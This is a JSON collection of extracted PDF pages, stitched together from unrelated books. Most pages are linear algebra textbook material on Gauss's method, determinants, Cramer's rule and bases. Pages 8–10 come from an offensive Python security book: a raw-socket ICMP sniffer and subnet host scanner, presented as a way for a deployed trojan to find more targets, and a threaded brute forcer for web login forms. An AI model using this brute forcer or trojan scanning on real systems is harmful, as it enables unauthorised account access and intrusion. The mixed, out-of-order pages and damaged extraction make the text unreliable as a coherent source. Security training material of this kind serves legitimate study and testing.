{
    "Page_1": "Contents\nChapter One: Linear Systems\nI Solving Linear Systems . . . . . . . . . . . . . . . . . . . . . . . . 1\nI.1 Gauss\u2019s Method . . . . . . . . . . . . . . . . . . . . . . . . . 2\nI.2 Describing the Solution Set . . . . . . . . . . . . . . . . . . . 13\nI.3 General=Particular+Homogeneous. . . . . . . . . . . . . . 23\nII Linear Geometry . . . . . . . . . . . . . . . . . . . . . . . . . . . 35\nII.1 Vectors in Space* . . . . . . . . . . . . . . . . . . . . . . . . 35\nII.2 Length and Angle Measures* . . . . . . . . . . . . . . . . . . 42\nIII Reduced Echelon Form . . . . . . . . . . . . . . . . . . . . . . . . 50\nIII.1 Gauss-Jordan Reduction . . . . . . . . . . . . . . . . . . . . . 50\nIII.2 The Linear Combination Lemma . . . . . . . . . . . . . . . . 56\nTopic: Computer Algebra Systems . . . . . . . . . . . . . . . . . . . 65\nTopic: Accuracy of Computations . . . . . . . . . . . . . . . . . . . . 67\nTopic: Analyzing Networks . . . . . . . . . . . . . . . . . . . . . . . . 71\nChapter Two: Vector Spaces\nI Definition of Vector Space . . . . . . . . . . . . . . . . . . . . . . 78\nI.1 Definition and Examples . . . . . . . . . . . . . . . . . . . . 78\nI.2 Subspaces and Spanning Sets . . . . . . . . . . . . . . . . . . 90\nII Linear Independence . . . . . . . . . . . . . . . . . . . . . . . . . 101\nII.1 Definition and Examples . . . . . . . . . . . . . . . . . . . . 101\nIII Basis and Dimension . . . . . . . . . . . . . . . . . . . . . . . . . 114\nIII.1 Basis. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114\nIII.2 Dimension . . . . . . . . . . . . . . . . . . . . . . . . . . . . 121\nIII.3 Vector Spaces and Linear Systems . . . . . . . . . . . . . . . 127\nIII.4 Combining Subspaces*. . . . . . . . . . . . . . . . . . . . . . 135\nTopic: Fields. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\nwww.dbooks.org",
    "Page_2": "2 Chapter One. Linear Systems\nmustequalthenumberpresentafterward. Applyingthatinturntotheelements\nC, H, N, and O gives this system.\n7x=7z\n8x+1y=5z+2w\n1y=3z\n3y=6z+1w\nBoth examples come down to solving a system of equations. In each system,\nthe equations involve only the first power of each variable. This chapter shows\nhow to solve any such system of equations.\nI.1 Gauss\u2019s Method\n1.1 Definition A linear combination of x , ..., x has the form\n1 n\na x +a x +a x +\u00b7\u00b7\u00b7+a x\n1 1 2 2 3 3 n n\nwhere the numbers a ,...,a \u2208R are the combination\u2019s coefficients. A linear\n1 n\nequation in the variables x , ..., x has the form a x +a x +a x +\u00b7\u00b7\u00b7+\n1 n 1 1 2 2 3 3\na x =d where d\u2208R is the constant.\nn n\nAn n-tuple (s ,s ,...,s )\u2208Rn is a solution of, or satisfies, that equation\n1 2 n\nif substituting the numbers s , ..., s for the variables gives a true statement:\n1 n\na s +a s +\u00b7\u00b7\u00b7+a s =d. A system of linear equations\n1 1 2 2 n n\na x + a x +\u00b7\u00b7\u00b7+ a x = d\n1,1 1 1,2 2 1,n n 1\na x + a x +\u00b7\u00b7\u00b7+ a x = d\n2,1 1 2,2 2 2,n n 2\n.\n.\n.\na x +a x +\u00b7\u00b7\u00b7+a x = d\nm,1 1 m,2 2 m,n n m\nhasthesolution(s ,s ,...,s )ifthatn-tupleisasolutionofalloftheequations.\n1 2 n\n1.2Example The combination 3x +2x of x and x is linear. The combination\n1 2 1 2\n3x2+2x is not a linear function of x and x , nor is 3x +2sin(x ).\n1 2 1 2 1 2\nWe usually take x , ..., x to be unequal to each other because in a\n1 n\nsum with repeats we can rearrange to make the elements unique, as with\n2x+3y+4x=6x+3y. We sometimes include terms with a zero coefficient, as\nin x\u22122y+0z, and at other times omit them, depending on what is convenient.",
    "Page_3": "Section I. Solving Linear Systems 7\nStrictly speaking, to solve linear systems we don\u2019t need the row rescaling\noperation. We have introduced it here because it is convenient and because we\nwill use it later in this chapter as part of a variation of Gauss\u2019s Method, the\nGauss-Jordan Method.\nAll of the systems so far have the same number of equations as unknowns.\nAll of them have a solution and for all of them there is only one solution. We\nfinish this subsection by seeing other things that can happen.\n1.12 Example This system has more equations than variables.\nx+3y= 1\n2x+ y=\u22123\n2x+2y=\u22122\nGauss\u2019s Method helps us understand this system also, since this\nx+ 3y= 1\n\u22122 \u2212\u03c11\u2192+\u03c12\n\u22125y=\u22125\n\u22122\u03c11+\u03c13\n\u22124y=\u22124\nshows that one of the equations is redundant. Echelon form\nx+ 3y= 1\n\u2212(4/ \u22125) \u2192\u03c12+\u03c13\n\u22125y=\u22125\n0= 0\ngives that y=1 and x=\u22122. The \u20180=0\u2019 reflects the redundancy.\nGauss\u2019s Method is also useful on systems with more variables than equations.\nThe next subsection has many examples.\nAnother way that linear systems can differ from the examples shown above\nis that some linear systems do not have a unique solution. This can happen in\ntwo ways. The first is that a system can fail to have any solution at all.\n1.13 Example Contrast the system in the last example with this one.\nx+3y= 1 x+ 3y= 1\n\u22122 \u2212\u03c11\u2192+\u03c12\n2x+ y=\u22123 \u22125y=\u22125\n\u22122\u03c11+\u03c13\n2x+2y= 0 \u22124y=\u22122\nHere the system is inconsistent: no pair of numbers (s ,s ) satisfies all three\n1 2\nequations simultaneously. Echelon form makes the inconsistency obvious.\nx+ 3y= 1\n\u2212(4/ \u22125) \u2192\u03c12+\u03c13\n\u22125y=\u22125\n0= 2\nThe solution set is empty.\nwww.dbooks.org",
    "Page_4": "Topic: Speed of Calculating Determinants 363\nm(p_row, p_row) entry is zero. Analysis of a finished version that includes all of\nthe tests and subcases is messier but would gives us roughly the same speed\nresults.)\nimport random\ndef random_matrix(num_rows, num_cols):\nm = []\nfor col in range(num_cols):\nnew_row = []\nfor row in range(num_rows):\nnew_row.append(random.uniform(0,100))\nm.append(new_row)\nreturn m\ndef gauss_method(m):\n\"\"\"Perform Gauss's Method on m. This code is for illustration only\nand should not be used in practice.\nm list of lists of numbers; each included list is a row\n\"\"\"\nnum_rows, num_cols = len(m), len(m[0])\nfor p_row in range(num_rows):\nfor row in range(p_row+1, num_rows):\nfactor = -m[row][p_row] / float(m[p_row][p_row])\nnew_row = []\nfor col_num in range(num_cols):\np_entry, entry = m[p_row][col_num], m[row][col_num]\nnew_row.append(entry+factor*p_entry)\nm[row] = new_row\nreturn m\nresponse = raw_input('number of rows? ')\nnum_rows = int(response)\nm = random_matrix(num_rows, num_rows)\nfor row in m:\nprint row\nM = gauss_method(m)\nprint \"-----\"\nfor row in M:\nprint row\nBesides a routine to do Gauss\u2019s Method, this program also has a routine to\ngenerate a matrix filled with random numbers (the numbers are between 0\nand 100, to make them readable below). This program prompts a user for the\nnumber of rows, generates a random square matrix of that size, and does row\nreduction on it.\n$ python gauss_method.py\nnumber of rows? 4\n[69.48033741746909, 32.393754742132586, 91.35245787350696, 87.04557918402462]\n[98.64189032145111, 28.58228108715638, 72.32273998878178, 26.310252241189257]\n[85.22896214660841, 39.93894635139987, 4.061683241757219, 70.5925099861901]\n[24.06322759315518, 26.699175587284373, 37.398583921673314, 87.42617087562161]\n-----\n[69.48033741746909, 32.393754742132586, 91.35245787350696, 87.04557918402462]\n[0.0, -17.40743803545155, -57.37120602662462, -97.2691774792963]\n[0.0, 0.0, -108.66513774392809, -37.31586824349682]\n[0.0, 0.0, 0.0, -13.678536859817994]\nInside of the gauss_method routine, for each row prow, the routine performs\nfactor\u00b7\u03c1prow +\u03c1row on the rows below. For each of these rows below, this\nwww.dbooks.org",
    "Page_5": "384 Chapter Five. Similarity\nConsequently in this chapter we shall use complex numbers for our scalars,\nincluding entries in vectors and matrices. That is, we shift from studying vector\nspaces over the real numbers to vector spaces over the complex numbers. Any\nreal number is a complex number and in this chapter most of the examples use\nonly real numbers but nonetheless, the critical theorems require that the scalars\nbe complex. So this first section is a review of complex numbers.\nIn this book our approach is to shift to this more general context of taking\nscalars to be complex for the pragmatic reason that we must do so in order\nto move forward. However, the idea of doing vector spaces by taking scalars\nfrom a structure other than the real numbers is an interesting and useful one.\nDelightful presentations that take this approach from the start are in [Halmos]\nand [Hoffman & Kunze].\nI.1 Polynomial Factoring and Complex Numbers\nThis subsection is a review only. For a full development, including proofs,\nsee [Ebbinghaus].\nConsider a polynomial p(x)=c xn+\u00b7\u00b7\u00b7+c x+c with leading coefficient\nn 1 0\nc (cid:54)= 0. The degree of the polynomial is n. If n = 0 then p is a constant\nn\npolynomial p(x)=c . Constant polynomials that are not the zero polynomial,\n0\nc (cid:54)=0, have degree zero. We define the zero polynomial to have degree \u2212\u221e .\n0\n1.1 Remark Defining the degree of the zero polynomial to be \u2212\u221e allows the\nequation degree(fg)=degree(f)+degree(g) to hold for all polynomials.\nJust as integers have a division operation\u2014e.g., \u20184 goes 5 times into 21 with\nremainder 1\u2019\u2014so do polynomials.\n1.2Theorem (DivisionTheoremforPolynomials) Let p(x) be a polynomial. If d(x)\nis a non-zero polynomial then there are quotient and remainder polynomials\nq(x) and r(x) such that\np(x)=d(x)\u00b7q(x)+r(x)\nwhere the degree of r(x) is strictly less than the degree of d(x).\nThe point of the integer statement \u20184 goes 5 times into 21 with remainder\n1\u2019 is that the remainder is less than 4\u2014while 4 goes 5 times, it does not go 6\ntimes. Similarly, the final clause of the polynomial division statement is crucial.\n1.3 Example If p(x)=2x3\u22123x2+4x and d(x)=x2+1 then q(x)=2x\u22123 and",
    "Page_6": "Topic\nCramer\u2019s Rule\nA linear system is equivalent to a linear relationship among vectors.\n(cid:32) (cid:33) (cid:32) (cid:33) (cid:32) (cid:33)\nx +2x =6 1 2 6\n1 2 \u21d0\u21d2 x \u00b7 +x \u00b7 =\n3x + x =8 1 3 2 1 8\n1 2\nIn the picture below the small parallelogram is formed from sides that are\n(cid:0)1(cid:1) (cid:0)2(cid:1) (cid:0)1(cid:1)\nthe vectors and . It is nested inside a parallelogram with sides x\n3 1 1 3\n(cid:0)2(cid:1)\nand x . By the vector equation, the far corner of the larger parallelogram is\n2 1\n(cid:0)6(cid:1)\n.\n8\n(cid:18)6(cid:19)\n8\n(cid:18)1(cid:19)\nx1\u00b7\n3\n(cid:18)1(cid:19)\n3\n(cid:18)2(cid:19)\nx2\u00b7\n(cid:18)2(cid:19) 1\n1\nThis drawing restates the algebraic question of finding the solution of a linear\nsystem into geometric terms: by what factors x and x must we dilate the sides\n1 2\nof the starting parallelogram so that it will fill the other one?\nWe can use this picture, and our geometric understanding of determinants,\nto get a new formula for solving linear systems. Compare the sizes of these\nshaded boxes.\n(cid:18)6(cid:19)\n8\n(cid:18)1(cid:19)\nx1\u00b7\n3\n(cid:18)1(cid:19)\n3\n(cid:18)2(cid:19) (cid:18)2(cid:19) (cid:18)2(cid:19)\n1 1 1\nwww.dbooks.org",
    "Page_7": "Section III. Laplace\u2019s Formula 355\n1.5 Theorem (Laplace Expansion of Determinants) Where T is an n\u00d7n matrix, we\ncan find the determinant by expanding by cofactors on any row i or column j.\n|T|=t \u00b7T +t \u00b7T +\u00b7\u00b7\u00b7+t \u00b7T\ni,1 i,1 i,2 i,2 i,n i,n\n=t \u00b7T +t \u00b7T +\u00b7\u00b7\u00b7+t \u00b7T\n1,j 1,j 2,j 2,j n,j n,j\nProof Exercise 27. QED\n1.6 Example We can compute the determinant\n(cid:12) (cid:12)\n(cid:12)1 2 3(cid:12)\n(cid:12) (cid:12)\n|T|=(cid:12)4 5 6(cid:12)\n(cid:12) (cid:12)\n(cid:12) (cid:12)\n(cid:12)7 8 9(cid:12)\nby expanding along the first row, as in Example 1.1.\n(cid:12) (cid:12) (cid:12) (cid:12) (cid:12) (cid:12)\n(cid:12)5 6(cid:12) (cid:12)4 6(cid:12) (cid:12)4 5(cid:12)\n|T|=1\u00b7(+1)(cid:12) (cid:12)+2\u00b7(\u22121)(cid:12) (cid:12)+3\u00b7(+1)(cid:12) (cid:12)=\u22123+12\u22129=0\n(cid:12)8 9(cid:12) (cid:12)7 9(cid:12) (cid:12)7 8(cid:12)\n(cid:12) (cid:12) (cid:12) (cid:12) (cid:12) (cid:12)\nOr, we could expand down the second column.\n(cid:12) (cid:12) (cid:12) (cid:12) (cid:12) (cid:12)\n(cid:12)4 6(cid:12) (cid:12)1 3(cid:12) (cid:12)1 3(cid:12)\n|T|=2\u00b7(\u22121)(cid:12) (cid:12)+5\u00b7(+1)(cid:12) (cid:12)+8\u00b7(\u22121)(cid:12) (cid:12)=12\u221260+48=0\n(cid:12)7 9(cid:12) (cid:12)7 9(cid:12) (cid:12)4 6(cid:12)\n(cid:12) (cid:12) (cid:12) (cid:12) (cid:12) (cid:12)\n1.7 Example A row or column with many zeroes suggests a Laplace expansion.\n(cid:12) (cid:12)\n(cid:12)1 5 0(cid:12) (cid:12) (cid:12) (cid:12) (cid:12) (cid:12) (cid:12)\n(cid:12) (cid:12) (cid:12)2 1 (cid:12) (cid:12)1 5 (cid:12) (cid:12)1 5(cid:12)\n(cid:12)2 1 1(cid:12)=0\u00b7(+1)(cid:12) (cid:12)+1\u00b7(\u22121)(cid:12) (cid:12)+0\u00b7(+1)(cid:12) (cid:12)=16\n(cid:12) (cid:12) (cid:12)3 \u22121(cid:12) (cid:12)3 \u22121(cid:12) (cid:12)2 1(cid:12)\n(cid:12) (cid:12) (cid:12) (cid:12) (cid:12) (cid:12) (cid:12) (cid:12)\n(cid:12)3 \u22121 0(cid:12)\nWe finish by applying Laplace\u2019s expansion to derive a new formula for the\ninverse of a matrix. With Theorem 1.5, we can calculate the determinant of a\nmatrix by taking linear combinations of entries from a row with their associated\ncofactors.\nt \u00b7T +t \u00b7T +\u00b7\u00b7\u00b7+t \u00b7T =|T| (\u2217)\ni,1 i,1 i,2 i,2 i,n i,n\nRecall that a matrix with two identical rows has a zero determinant. Thus,\nweighting the cofactors by entries from row k with k(cid:54)=i gives zero\nt \u00b7T +t \u00b7T +\u00b7\u00b7\u00b7+t \u00b7T =0 (\u2217\u2217)\ni,1 k,1 i,2 k,2 i,n k,n\nbecause it represents the expansion along the row k of a matrix with row i equal\nto row k. This summarizes (\u2217) and (\u2217\u2217).\n\uf8eb \uf8f6\uf8eb \uf8f6 \uf8eb \uf8f6\nt t ... t T T ... T |T| 0 ... 0\n1,1 1,2 1,n 1,1 2,1 n,1\n\uf8ec t t ... t \uf8f7\uf8ecT T ... T \uf8f7 \uf8ec0 |T| ... 0\uf8f7\n\uf8ec 2,1 2,2 2,n \uf8f7\uf8ec 1,2 2,2 n,2\uf8f7 \uf8ec \uf8f7\n\uf8ec . \uf8f7\uf8ec . \uf8f7=\uf8ec . \uf8f7\n\uf8ec . \uf8f7\uf8ec . \uf8f7 \uf8ec . \uf8f7\n\uf8ed . \uf8f8\uf8ed . \uf8f8 \uf8ed . \uf8f8\nt t ... t T T ... T 0 0 ... |T|\nn,1 n,2 n,n 1,n 2,n n,n\nwww.dbooks.org",
    "Page_8": "buf = raw_buffer[offset:offset + sizeof(ICMP)]\n# create our ICMP structure\nx icmp_header = ICMP(buf)\nprint \"ICMP -> Type: %d Code: %d\" % (icmp_header.type, icmp_header.\u00ac\ncode)\nThis simple piece of code creates an ICMP structure u underneath our\nexisting IP structure. When the main packet-receiving loop determines\nthat we have received an ICMP packet v, we calculate the offset in the raw\npacket where the ICMP body lives w and then create our buffer x and\nprint out the type and code fields. The length calculation is based on the\nIP header ihl field, which indicates the number of 32-bit words (4-byte\nchunks) contained in the IP header. So by multiplying this field by 4, we\nknow the size of the IP header and thus when the next network layer\u2014\nICMP in this case\u2014begins.\nIf we quickly run this code with our typical ping test, our output should\nnow be slightly different, as shown below:\nProtocol: ICMP 74.125.226.78 -> 192.168.0.190\nICMP -> Type: 0 Code: 0\nThis indicates that the ping (ICMP Echo) responses are being correctly\nreceived and decoded. We are now ready to implement the last bit of logic\nto send out the UDP datagrams, and to interpret their results.\nNow let\u2019s add the use of the netaddr module so that we can cover an\nentire subnet with our host discovery scan. Save your sniffer_with_icmp.py\nscript as scanner.py and add the following code:\nimport threading\nimport time\nfrom netaddr import IPNetwork,IPAddress\n--snip--\n# host to listen on\nhost = \"192.168.0.187\"\n# subnet to target\nsubnet = \"192.168.0.0/24\"\n# magic string we'll check ICMP responses for\nu magic_message = \"PYTHONRULES!\"\n# this sprays out the UDP datagrams\nv def udp_sender(subnet,magic_message):\ntime.sleep(5)\nsender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nfor ip in IPNetwork(subnet):\n44 Chapter 3\nwww.it-ebooks.info",
    "Page_9": "tHe netaDDr moDUle\nOur scanner is going to use a third-party library called netaddr, which will\nallow us to feed in a subnet mask such as 192 .168 .0 .0/24 and have our scan-\nner handle it appropriately . Download the library from here: http://code.google\n.com/p/netaddr/downloads/list\nOr, if you installed the Python setup tools package in Chapter 1, you can\nsimply execute the following from a command prompt:\neasy_install netaddr\nThe netaddr module makes it very easy to work with subnets and address-\ning . For example, you can run simple tests like the following using the IPNetwork\nobject:\nip_address = \"192.168.112.3\"\nif ip_address in IPNetwork(\"192.168.112.0/24\"):\nprint True\nOr you can create simple iterators if you want to send packets to an entire\nnetwork:\nfor ip in IPNetwork(\"192.168.112.1/24\"):\ns = socket.socket()\ns.connect((ip, 25))\n# send mail packets\nThis will greatly simplify your programming life when dealing with entire\nnetworks at a time, and it is ideally suited for our host discovery tool . After it\u2019s\ninstalled, you are ready to proceed .\nc:\\Python27\\python.exe scanner.py\nHost Up: 192.168.0.1\nHost Up: 192.168.0.190\nHost Up: 192.168.0.192\nHost Up: 192.168.0.195\nFor a quick scan like the one I performed, it only took a few seconds to\nget the results back. By cross-referencing these IP addresses with the DHCP\ntable in my home router, I was able to verify that the results were accurate.\nYou can easily expand what you\u2019ve learned in this chapter to decode TCP\nand UDP packets, and build additional tooling around it. This scanner is\nalso useful for the trojan framework we will begin building in Chapter 7.\nThis would allow a deployed trojan to scan the local network looking for\nadditional targets. Now that we have the basics down of how networks work\non a high and low level, let\u2019s explore a very mature Python library called\nScapy.\n46 Chapter 3\nwww.it-ebooks.info",
    "Page_10": "the username_field and password_field v variables to the appropriate name\nof the HTML elements. Our success_check variable w is a string that we\u2019ll\ncheck for after each brute-forcing attempt in order to determine whether\nwe are successful or not. Let\u2019s now create the plumbing for our brute forcer;\nsome of the following code will be familiar so I\u2019ll only highlight the newest\ntechniques.\nclass Bruter(object):\ndef __init__(self, username, words):\nself.username = username\nself.password_q = words\nself.found = False\nprint \"Finished setting up for: %s\" % username\ndef run_bruteforce(self):\nfor i in range(user_thread):\nt = threading.Thread(target=self.web_bruter)\nt.start()\ndef web_bruter(self):\nwhile not self.password_q.empty() and not self.found:\nbrute = self.password_q.get().rstrip()\nu jar = cookielib.FileCookieJar(\"cookies\")\nopener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))\nresponse = opener.open(target_url)\npage = response.read()\nprint \"Trying: %s : %s (%d left)\" % (self.username,brute,self.\u00ac\npassword_q.qsize())\n# parse out the hidden fields\nv parser = BruteParser()\nparser.feed(page)\npost_tags = parser.tag_results\n# add our username and password fields\nw post_tags[username_field] = self.username\npost_tags[password_field] = brute\nx login_data = urllib.urlencode(post_tags)\nlogin_response = opener.open(target_post, login_data)\nlogin_result = login_response.read()\ny if success_check in login_result:\nself.found = True\nWeb Hackery 71\nwww.it-ebooks.info",
    "Page_11": "278 VectorSpace Rn\nTheorem 5.2.6\nLetU = 0 beasubspaceofRn.Then:\n6 { }\n1. U hasabasisanddimU n.\n\u2264\n2. AnyindependentsetinU canbeenlarged(byaddingvectorsfromthestandardbasis)toa\nbasisofU.\n3. AnyspanningsetforU canbecutdown(bydeletingvectors)toabasisofU.\nExample5.2.13\nFind abasisofR4 containingS= u, v whereu=(0, 1, 2, 3)and v=(2, 1, 0, 1).\n{ } \u2212\nSolution. By Theorem 5.2.6wecan find such abasisby addingvectorsfromthestandardbasis of\nR4 to S. Ifwe trye =(1, 0, 0, 0), wefind easilythat e , u, v is independent. Nowaddanother\n1 1\n{ }\nvectorfrom thestandardbasis,say e .\n2\nAgainwefind thatB= e , e , u, v isindependent. SinceB has 4= dimR4 vectors,then B\n1 2\n{ }\nmustspanR4 byTheorem 5.2.7below(orsimplyverifyit directly). HenceB isa basisofR4.\nTheorem 5.2.6hasa numberofusefulconsequences. Hereisthefirst.\nTheorem 5.2.7\nLetU beasubspaceofRn wheredimU =mandletB= x , x , ..., x beasetofmvectorsin\n1 2 m\n{ }\nU.ThenBisindependentifandonlyifBspansU.\nProof. Suppose B is independent. If B does not span U then, by Theorem 5.2.6, B can be enlarged to a\nbasis ofU containing more than m vectors. This contradicts the invariance theorem because dimU =m,\nso B spans U. Conversely, if B spans U but is not independent, then B can be cut down to a basis of U\ncontainingfewerthanm vectors,againacontradiction. So B isindependent,as required.\nAs we saw in Example 5.2.13, Theorem 5.2.7 is a \u201clabour-saving\u201d result. It asserts that, given a\nsubspaceU ofdimensionmandasetBofexactlymvectorsinU,toprovethatBisabasisofU itsuffices\ntoshoweitherthatB spansU orthat Bis independent. Itis notnecessary toverify bothproperties.\nTheorem 5.2.8\nLetU W besubspacesofRn.Then:\n\u2286\n1. dimU dimW.\n\u2264\n2. IfdimU = dimW,thenU =W.",
    "Page_12": "5.2.Independenceand Dimension 281\ne. (2, 1, 1, 3), (1, 1, 0, 2), (0, 1, 0, 3), Exercise 5.2.12 If x , x , x , ..., x isindependent,\n1 2 3 k\n{ \u2212 \u2212 { }\n( 1, 2, 3, 1) inR4 show x , x +x , x +x +x , ..., x +x + +x\n1 1 2 1 2 3 1 2 k\n\u2212 } { \u00b7\u00b7\u00b7 }\nisalsoindependent.\nf. (1, 0, 2, 5), (4, 4, 3, 2), (0, 1, 0, 3),\n{ \u2212 \u2212 \u2212\n(1, 3, 3, 10) inR4 Exercise 5.2.13 If y, x 1, x 2, x 3, ..., x k is indepen-\n\u2212 } { }\ndent, show that y+x , y+x , y+x , ..., y+x is\n1 2 3 k\n{ }\nExercise 5.2.7 In each case show that the statement is alsoindependent.\ntrueorgiveanexampleshowingthatitisfalse.\nExercise 5.2.14 If x , x , ..., x is independent in\n1 2 k\n{ }\na. If x, y is independent, then x, y, x+y is in- Rn, and if y is not in span x 1, x 2, ..., x , show that\nk\n{ } { } { }\ndependent. x , x , ..., x , y isindependent.\n1 2 k\n{ }\nb. If x, y, z isindependent,then y, z isindepen- Exercise5.2.15 IfAandBarematricesandthecolumns\n{ } { }\ndent. ofABareindependent,showthatthecolumnsofBarein-\ndependent.\nc. If y, z isdependent, then x, y, z isdependent\n{ } { } Exercise 5.2.16 Suppose that x, y is a basis of R2,\nforanyx.\n{ }\na b\nandletA= .\nd. If all of x 1, x 2, ..., x k are nonzero, then c d\nx , x , ..., x isindependent. (cid:20) (cid:21)\n1 2 k\n{ }\na. If A is invertible, show that ax+by, cx+dy is\ne. If one of x , x , ..., x is zero, then { }\n1 2 k abasisofR2.\nx , x , ..., x isdependent.\n1 2 k\n{ }\nb. If ax+by, cx+dy isabasisofR2,showthatA\nf. Ifax+by+cz=0,then x, y, z isindependent. { }\n{ } isinvertible.\ng. If x, y, z isindependent, thenax+by+cz=0\n{ }\nforsomea,b,andcinR. Exercise5.2.17 LetAdenote anm nmatrix.\n\u00d7\nh. If x 1, x 2, ..., x k isdependent,thent 1x 1+t 2x 2+ a. Show that nullA= null(UA)for every invertible\n{ }\n+t kx k=0forsomenumberst iinRnotallzero. m mmatrixU.\n\u00b7\u00b7\u00b7 \u00d7\ni. If x 1, x 2, ..., x k is independent, then t 1x 1+ b. Show that dim(nullA) = dim(null(AV)) for\n{ }\nt 2x 2+ +t kx k =0forsomet i inR. every invertible n n matrix V. [Hint: If\n\u00b7\u00b7\u00b7\n\u00d7\nx , x , ..., x is a basis of nullA, show\nj. Everynon-empty subset ofalinearly independent 1 2 k\n{ }\nthat V 1x , V 1x , ..., V 1x is a basis of\nsetisagainlinearly independent. \u2212 1 \u2212 2 \u2212 k\n{ }\nnull(AV).]\nk. Every set containing a spanning set is again a\nspanning set. Exercise5.2.18 LetAdenote anm nmatrix.\n\u00d7\nExercise5.2.8 IfAisann nmatrix,showthat detA= a. Show that imA = im(AV) for every invertible\n\u00d7\n0ifandonlyifsomecolumnofAisalinearcombination n nmatrixV.\n\u00d7\noftheothercolumns.\nb. Show that dim(imA) = dim(im(UA)) for ev-\nExercise 5.2.9 Let x, y, z be a linearly independent\nery invertible m m matrix U. [Hint: If\n{ }\nset in R4. Show that x, y, z, e is a basis of R4 for \u00d7\nk y , y , ..., y is abasis of im(UA), show that\n{ } 1 2 k\nsomee k inthestandardbasis e 1, e 2, e 3, e 4 . { U 1y , U 1y } , ..., U 1y isabasisof imA.]\n{ } \u2212 1 \u2212 2 \u2212 k\n{ }\nExercise 5.2.10 If x , x , x , x , x , x is an inde-\n1 2 3 4 5 6\npendent setofvector{ s, show thatthesubset} x , x , x Exercise 5.2.19 LetU andW denote subspaces of Rn,\n2 3 5\n{ }\nisalsoindependent. and assume that U W. If dimU = n 1, show that\n\u2286 \u2212\neitherW =U orW =Rn.\nExercise 5.2.11 Let A be any m n matrix, and\nlet b , b , b , ..., b be columns \u00d7 in Rm such that Exercise 5.2.20 LetU andW denote subspaces of Rn,\n1 2 3 k\nthe system Ax = b has a solution x for each i. If andassume thatU W. If dimW =1, show that either\ni i \u2286\nb , b , b , ..., b is independent in Rm, show that U = 0 orU =W.\n{ 1 2 3 k } { }\nx , x , x , ..., x isindependent inRn.\n1 2 3 k\n{ }\nwww.dbooks.org",
    "Page_13": "3.1.BasicTechniquesand Properties 123\nLet usprovethecasewhen j=2.\nLetBbethematrixobtainedfromAbyinterchangingits1stand2ndrows. ThenbyTheorem3.33we\nhave\ndetA= detB.\n\u2212\nNowwehave\nn\ndetB= \u2211b cof(B) .\n1,i 1,i\ni=1\nSince B is obtained by interchanging the 1st and 2nd rows of A we have that b =a for all i and one\n1,i 2,i\ncan seethat minor(B) =minor(A) .\n1,i 2,i\nFurther,\ncof(B) =( 1)1+iminorB = ( 1)2+iminor(A) = cof(A)\n1,i 1,i 2,i 2,i\n\u2212 \u2212 \u2212 \u2212\nhencedetB= \u2211n a cof(A) ,and therefore detA= detB=\u2211n a cof(A) as desired.\ni=1 2,i 2,i i=1 2,i 2,i\n\u2212 \u2212\nThecasewhen j>2isverysimilar;westillhaveminor(B) =minor(A) butcheckingthatdetB=\n1,i j,i\n\u2211n a cof(A) isslightlymoreinvolved.\ni=1 j,i j,i\n\u2212\nNowthecofactorexpansionalongcolumn j ofAisequaltothecofactorexpansionalongrow j ofAT,\nwhichisbytheaboveresultjustprovedequaltothecofactorexpansionalongrow1ofAT,whichisequal\nto the cofactor expansion along column 1 of A. Thus the cofactor cofactor along any column yields the\nsameresult.\nFinally, since detA =detAT by Theorem 3.35, we conclude that the cofactor expansion along row 1\nof A is equal to the cofactor expansion along row 1 of AT, which is equal to the cofactor expansion along\ncolumn1 ofA. Thustheproofiscomplete.\n\u2660\n3.1.5. Finding Determinants using Row Operations\nTheorems 3.16, 3.18 and 3.21 illustrate how row operations affect the determinant of a matrix. In this\nsection,welookat two exampleswhere rowoperationsare usedto find thedeterminantofa largematrix.\nRecall that when working with large matrices, Laplace Expansion is effective but timely, as there are\nmany steps involved. This section provides useful tools for an alternative method. By first applying row\noperations,wecan obtainasimplermatrixtowhich weapplyLaplaceExpansion.\nWhile working through questions such as these, it is useful to record your row operations as you go\nalong. Keep thisinmindas youread throughthenextexample.\nExample3.37:Finding a Determinant\nFindthedeterminantofthematrix\n1 2 3 4\n5 1 2 3\nA=\uf8ee \uf8f9\n4 5 4 3\n\uf8ef 2 2 4 5 \uf8fa\n\uf8ef \u2212 \uf8fa\n\uf8f0 \uf8fb\nSolution. We will use the properties of determinants outlined above to find det(A). First, add 5 times\n\u2212\nthe first row to the second row. Then add 4 times the first row to the third row, and 2 times the first\n\u2212 \u2212\nwww.dbooks.org",
    "Page_14": "130 Determinants\nExercise 3.1.25 Findthedeterminantusingrowoperationsto firstsimplify.\n1 4 1 2\n3 2 2 3\n(cid:12) \u2212 (cid:12)\n(cid:12) 1 0 3 3 (cid:12)\n(cid:12) \u2212 (cid:12)\n(cid:12) 2 1 2 2 (cid:12)\n(cid:12) \u2212 (cid:12)\n(cid:12) (cid:12)\n(cid:12) (cid:12)\n(cid:12) (cid:12)\n3.2 Applications of the Determinant\nOutcomes\nA. Usedeterminantstodeterminewhetheramatrixhasaninverse,andevaluatetheinverseusing\ncofactors.\nB. ApplyCramer\u2019sRuletosolvea2 2ora3 3linearsystem.\n\u00d7 \u00d7\nC. Givendatapoints,findanappropriateinterpolatingpolynomialanduseittoestimatepoints.\n3.2.1. A Formula for the Inverse\nThe determinant of a matrix also provides a way to find the inverse of a matrix. Recall the definition of\ntheinverseofamatrixinDefinition2.33. WesaythatA 1,an n n matrix,istheinverseofA,alson n,\n\u2212\n\u00d7 \u00d7\nifAA 1 =I and A 1A=I.\n\u2212 \u2212\nWe now define a new matrix called the cofactor matrix of A. The cofactor matrix of A is the matrix\nwhoseijth entryis theijth cofactorofA. Theformal definitionisas follows.\nDefinition 3.39:The CofactorMatrix\nLetA = a beann n matrix. ThenthecofactormatrixofA,denotedcof(A),isdefinedby\nij\n\u00d7\ncof(A)= cof(A) wherecof(A) istheijth cofactorofA.\n(cid:2) (cid:3) ij ij\nh i\nNotethatcof(A) denotes theijth entryofthecofactormatrix.\nij\nWe will use the cofactor matrix to create a formula for the inverseof A. First, we define the adjugate\nofAtobethetransposeofthecofactormatrix. Wecan alsocallthismatrixtheclassicaladjointofA,and\nwedenoteitbyadj(A).\nIn thespecificcasewhere A isa2 2 matrixgivenby\n\u00d7\na b\nA=\nc d\n(cid:20) (cid:21)",
